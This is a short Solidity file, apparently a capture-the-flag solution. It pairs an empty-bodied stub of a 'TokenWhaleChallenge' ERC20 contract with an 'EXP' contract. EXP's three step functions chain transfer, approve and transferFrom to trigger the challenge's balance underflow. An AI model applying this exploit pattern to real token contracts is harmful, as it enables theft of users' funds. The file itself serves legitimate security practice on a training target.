pragma solidity ^0.4.21;

contract TokenWhaleChallenge {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function TokenWhaleChallenge(address _player) public {}

    function isComplete() public view returns (bool) {}

    event Transfer(address indexed from, address indexed to, uint256 value);

    function _transfer(address to, uint256 value) internal {}

    function transfer(address to, uint256 value) public {}

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {}

    function transferFrom(address from, address to, uint256 value) public {}
}

contract EXP {
    TokenWhaleChallenge victim;
    constructor(address _addr){
        victim  = TokenWhaleChallenge(_addr);
    }

    function setp1_transfer_A_to_B(address _addrB) public payable {
        victim.transfer(_addrB, 510);
    }

    function setp2_approveA(address _addrA) public payable {
        victim.approve(_addrA, 1000);
    }

    function setp3_final_exp(address _addrB) public payable {
        victim.transferFrom(_addrB, _addrB, 490);
    }
}
